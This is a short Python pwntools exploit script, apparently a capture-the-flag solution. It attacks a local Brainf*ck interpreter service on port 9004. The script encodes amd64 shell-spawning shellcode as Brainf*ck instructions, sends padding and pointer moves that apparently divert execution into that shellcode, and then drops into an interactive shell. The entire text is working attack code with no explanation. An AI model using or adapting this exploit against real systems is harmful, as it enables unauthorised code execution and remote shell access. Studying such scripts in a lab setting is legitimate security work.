from pwn import *

context.arch = 'amd64'

# p = process("./app.py")
p = remote("localhost", 9004)

shellcode = asm(shellcraft.sh())

payload = b''
for i in range(len(shellcode)):
    for j in range(shellcode[i]):
        payload += b'+'
    payload += b'>'
payload += b'.'*0x400
payload += b'['
payload += b'<'*0x3c53

p.sendlineafter(b'Brainf*ck code: ', payload)
p.recvuntil(b'\x00'*0x400)

p.interactive()
